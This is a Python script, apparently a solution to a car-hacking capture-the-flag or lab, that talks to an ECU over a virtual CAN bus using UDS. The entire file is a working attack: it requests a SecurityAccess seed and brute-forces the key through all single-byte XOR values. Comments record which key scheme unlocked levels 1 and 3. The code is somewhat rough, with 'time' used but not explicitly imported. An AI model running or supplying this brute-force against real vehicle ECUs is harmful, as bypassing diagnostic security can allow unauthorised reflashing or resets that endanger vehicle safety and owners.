from udsoncan import *
from udsoncan.services import * # SecurityAccess, ECUReset...
from udsoncan.connections import *

my_connection = IsoTPSocketConnection('vcan0', 0x7e8, 0x7e0)
my_connection.open()
assert my_connection.is_open()
LEVEL = 0x1 # 0x3
SEED_LENGTH = 4

def getSeed():

    # Warp up
    my_connection.send(b'\x27\x01')

    # Request Seed (LEVEL)
    req = Request(SecurityAccess, subfunction=LEVEL)

    my_connection.send(req.get_payload())

    payload = my_connection.wait_frame(timeout=1)

    response = Response.from_payload(payload)
    #response.service_data
    print(response.data)


def getSeedViaServices() -> str:
    # Request Seed (LEVEL)
    req = SecurityAccess.make_request(LEVEL, SecurityAccess.Mode.RequestSeed)

    my_connection.send(req.get_payload())

    payload = my_connection.wait_frame(timeout=1)

    response = Response.from_payload(payload)
    seed = response.get_payload()
    seed = seed[-SEED_LENGTH:].hex()
    return seed


def keyCalculation(seed, X=0):
    #for i in range(SEED_LENGTH):
    b1 = int(seed[0:2],16)
    b2 = int(seed[2:4],16)
    b3 = int(seed[4:6],16)
    b4 = int(seed[6:8],16)
    
    seed = int(seed, 16)

    # 1) XOR
    # key = b1 ^ b2 # NO...

    # 2) Bitwise Inverse (~) OK FOR LEVEL 3 (VSEC HarborBay)
    # b1 = hex(~b1 & 0xFF)[2:]
    # b2 = hex(~b2 & 0xFF)[2:]
    # key = int(b1+b2, 16)
    # key = key.to_bytes(2, 'big')

    # 3) Single byte XOR (^ X) OK FOR LEVEL 1 (UserSpaceDiag)
    key_1 = hex(b1 ^ X)[2:] 
    key_2 = hex(b2 ^ X)[2:]
    key_3 = hex(b3 ^ X)[2:]
    key_4 = hex(b4 ^ X)[2:]
    key = int(key_1 + key_2 + key_3 + key_4, 16)
    key = key.to_bytes(4, 'big')

    return key

def SendKeyViaServices(seed):

    if SEED_LENGTH == 4:
        for X in range(256):
            key = keyCalculation(seed, X) #####
            time.sleep(0.5) # !! IMPORTANT !! #
            
            #Send Key (LEVEL)
            req = SecurityAccess.make_request(LEVEL, SecurityAccess.Mode.SendKey, data=key)

            my_connection.send(req.get_payload())
            payload = my_connection.wait_frame(timeout=1)
            response = Response.from_payload(payload)
            rep = response.get_payload()
            print(rep.hex())
            #print(rep.decode())
            
    elif SEED_LENGTH == 2:
        key = keyCalculation(seed) #####
        #Send Key (LEVEL)
        req = SecurityAccess.make_request(LEVEL, SecurityAccess.Mode.SendKey, data=key)

        my_connection.send(req.get_payload())
        payload = my_connection.wait_frame(timeout=1)
        response = Response.from_payload(payload)
        rep = response.get_payload()
        print(rep.hex())
        a ={
        #'response.service' : response.service,
        #'response.data' : response.data,
        'response.code' : response.code,
        }
        print(a)

    else:
        exit('SEED LENGTH NOT COVERED')


    
def main():
    seed = getSeedViaServices()
    SendKeyViaServices(seed)

if __name__ == '__main__':
    main()